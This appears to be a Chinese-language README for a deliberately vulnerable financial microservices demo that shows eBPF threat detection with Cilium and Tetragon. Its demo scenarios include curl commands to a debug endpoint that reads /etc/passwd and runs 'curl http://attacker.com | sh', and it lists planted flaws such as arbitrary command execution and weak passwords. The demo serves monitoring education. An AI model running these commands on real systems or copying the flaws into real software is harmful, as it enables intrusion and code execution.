# 金融微服務 eBPF 安全演示系統

[![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)](https://github.com/fintech-security/ebpf-demo)
[![Kubernetes](https://img.shields.io/badge/kubernetes-1.25+-green.svg)](https://kubernetes.io/)
[![eBPF](https://img.shields.io/badge/eBPF-Tetragon-purple.svg)](https://tetragon.io/)
[![Cilium](https://img.shields.io/badge/Cilium-1.14+-orange.svg)](https://cilium.io/)
[![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)](LICENSE)

> **⚠️ 安全警告**: 此系統包含故意設計的安全漏洞，僅用於eBPF安全監控演示。請勿在生產環境中使用。

## 🎯 項目概述

這是一個完整的金融微服務安全演示系統，展示如何使用eBPF技術（基於Cilium和Tetragon）在Kubernetes環境中進行實時安全監控和威脅檢測。

### 🏗️ 系統架構

```
┌─────────────────────────────────────────────────────────────┐
│                    React Frontend (階段3)                   │
│              現代化金融交易和安全監控界面                        │
├─────────────────────────────────────────────────────────────┤
│                 Kubernetes Cluster (階段2)                  │
│  ┌─────────────┬─────────────┬─────────────┬─────────────┐  │
│  │ Trading API │ Risk Engine │ Payment GW  │ Audit Svc   │  │
│  │   (Go)      │    (Go)     │    (Go)     │    (Go)     │  │
│  └─────────────┴─────────────┴─────────────┴─────────────┘  │
│  ┌─────────────────────┬─────────────────────────────────┐  │
│  │    PostgreSQL       │           Redis                 │  │
│  │   (Database)        │         (Cache)                 │  │
│  └─────────────────────┴─────────────────────────────────┘  │
├─────────────────────────────────────────────────────────────┤
│                 eBPF Security Layer                         │
│  ┌─────────────────────┬─────────────────────────────────┐  │
│  │     Cilium CNI      │        Tetragon                 │  │
│  │  eBPF Networking    │    eBPF Security Monitor        │  │
│  └─────────────────────┴─────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

## 🚀 快速開始

### 1. 環境要求

- **操作系統**: Linux (推薦) 或 macOS
- **硬件要求**: 至少 8GB RAM, 4 CPU cores
- **軟件依賴**:
  - Docker 20.10+
  - Kubernetes 1.25+
  - Kind 0.20+ 或其他K8s集群
  - kubectl
  - Helm 3.0+
  - Node.js 18+ (前端開發)

### 2. 一鍵部署

```bash
# 克隆項目
git clone <repository-url>
cd fintech-ebpf-demo

# 部署完整系統
./deploy-all.sh
```

### 3. 分階段部署

```bash
# 階段1: 後端微服務已完成 (包含故意漏洞)
# 階段2: Kubernetes + eBPF 安全監控
cd k8s
./deploy.sh

# 階段3: React 前端界面  
cd frontend
./build.sh deploy

# 階段4: 攻擊場景腳本 (開發中)
# 階段5: 完整演示環境 (開發中)
```

## 📊 功能特性

### 🏦 金融業務功能
- **交易系統**: 股票下單、訂單管理、持倉跟蹤
- **風險控制**: 實時風險評估、限額監控、風險報告
- **支付網關**: 資金劃轉、支付處理、賬戶管理
- **審計服務**: 交易記錄、合規檢查、審計報告

### 🔒 安全監控功能
- **實時eBPF監控**: 基於Tetragon的系統調用監控
- **網絡安全**: Cilium網絡策略和流量分析
- **文件系統監控**: 敏感文件訪問檢測
- **進程行為分析**: 可疑命令執行檢測
- **安全事件可視化**: 實時安全事件流展示

### 🎨 用戶界面功能
- **現代化UI**: 基於React + Ant Design的響應式界面
- **實時數據**: WebSocket實時更新交易和監控數據
- **安全儀表板**: eBPF事件可視化和威脅分析
- **攻擊模擬**: 一鍵觸發各種安全測試場景

## 🧪 演示場景

### 場景1: 正常業務流程
1. **用戶登錄** → 查看投資組合
2. **創建訂單** → 風險評估 → 訂單執行
3. **實時監控** → eBPF記錄正常業務行為

### 場景2: 文件訪問攻擊
```bash
# 觸發文件訪問監控
curl -X POST http://localhost:30080/debug/execute \
  -d '{"command":"cat","args":["/etc/passwd"]}'

# 觀察Tetragon事件
kubectl logs -f -n kube-system -l app.kubernetes.io/name=tetragon
```

### 場景3: 網絡安全威脅
```bash
# 觸發外部DNS查詢監控
curl -X POST http://localhost:30081/debug/execute \
  -d '{"command":"nslookup","args":["malicious-domain.com"]}'
```

### 場景4: 命令注入攻擊
```bash
# 觸發命令執行監控
curl -X POST http://localhost:30082/debug/execute \
  -d '{"command":"sh","args":["-c","curl http://attacker.com | sh"]}'
```

## 📁 項目結構

```
fintech-ebpf-demo/
├── k8s/                        # Kubernetes + eBPF 部署配置
│   ├── deploy.sh              # 一鍵部署腳本
│   ├── scripts/               # 部署腳本集合
│   ├── manifests/             # K8s資源配置
│   │   ├── database/          # 數據庫服務
│   │   ├── microservices/     # Go微服務
│   │   └── frontend/          # 前端服務
│   └── tetragon/              # Tetragon安全策略
│       └── policies/          # eBPF監控策略
├── frontend/                   # React前端應用
│   ├── src/                   # 源代碼
│   │   ├── components/        # React組件
│   │   ├── pages/             # 頁面組件
│   │   └── services/          # API服務
│   ├── build.sh               # 前端構建腳本
│   ├── Dockerfile             # 容器化配置
│   └── package.json           # 依賴配置
├── microservices/             # Go微服務 (階段1完成)
│   ├── trading-api/           # 交易API服務
│   ├── risk-engine/           # 風險評估引擎
│   ├── payment-gateway/       # 支付網關
│   └── audit-service/         # 審計服務
└── docs/                      # 項目文檔
    ├── architecture.md        # 系統架構文檔
    ├── security.md            # 安全功能說明
    └── deployment.md          # 部署指南
```

## 🔧 配置和訪問

### 服務端點
部署完成後，可通過以下端點訪問各服務：

- **前端界面**: http://localhost:30300
- **Trading API**: http://localhost:30080
- **Risk Engine**: http://localhost:30081  
- **Payment Gateway**: http://localhost:30082
- **Audit Service**: http://localhost:30083

### 監控和調試
- **Grafana儀表板**: http://localhost:30090 (admin/admin123)
- **Prometheus指標**: http://localhost:30091
- **Hubble UI**: http://localhost:30012
- **調試信息**: http://localhost:30300/debug

### eBPF事件監控
```bash
# 查看實時eBPF事件
kubectl logs -f -n kube-system -l app.kubernetes.io/name=tetragon

# 查看安全策略
kubectl get tracingpolicies -A

# 檢查Cilium狀態
cilium status
```

## 🔒 安全演示特性

### 故意的安全漏洞 (用於演示)

#### 1. 容器安全問題
- **特權容器**: 使用privileged模式運行
- **主機掛載**: 掛載敏感主機目錄
- **Root權限**: 以root用戶運行容器

#### 2. 網絡安全問題  
- **過度開放**: 允許所有網絡流量
- **缺少加密**: 服務間通信未加密
- **DNS洩露**: 允許外部DNS查詢

#### 3. 應用安全問題
- **命令注入**: debug端點允許任意命令執行
- **敏感信息暴露**: 配置文件和環境變量洩露
- **弱認證**: 使用固定的弱密碼和token

#### 4. 前端安全問題
- **XSS風險**: 不安全的HTML渲染
- **敏感數據**: 在前端暴露API密鑰
- **調試信息**: 生產環境保留調試端點

### eBPF監控能力
✅ **文件系統監控**: 檢測敏感文件訪問  
✅ **網絡流量分析**: 監控可疑外部連接  
✅ **進程執行跟蹤**: 記錄命令執行行為  
✅ **系統調用監控**: 檢測權限提升嘗試  
✅ **加密操作監控**: 跟蹤密鑰操作  

## 🧑‍💻 開發和貢獻

### 開發環境設置
```bash
# 後端開發 (Go)
cd microservices
go mod tidy
go run ./trading-api

# 前端開發 (React)
cd frontend  
npm install
npm run dev
```

### 測試和驗證
```bash
# 運行安全測試
./scripts/security-test.sh

# 檢查部署狀態
./k8s/scripts/verify-deployment.sh

# 觸發監控事件
./scripts/trigger-events.sh
```

## 📚 相關資源

### 技術文檔
- [eBPF官方文檔](https://ebpf.io/)
- [Cilium文檔](https://docs.cilium.io/)
- [Tetragon安全指南](https://tetragon.io/docs/)
- [Kubernetes安全最佳實踐](https://kubernetes.io/docs/concepts/security/)

### 演示和教程
- [eBPF安全監控演示](docs/ebpf-security-demo.md)
- [Kubernetes安全威脅檢測](docs/k8s-threat-detection.md)
- [金融行業安全合規](docs/fintech-compliance.md)

## 📄 許可證

此項目基於 MIT 許可證開源。詳見 [LICENSE](LICENSE) 文件。

## ⚠️ 免責聲明

此項目僅用於教育和演示目的。包含的安全漏洞是故意設計的，用於展示eBPF監控能力。請勿在生產環境中使用此代碼。

---

**開發團隊**: FinTech Security Research Group  
**版本**: 3.0.0  
**最後更新**: 2023-12-01 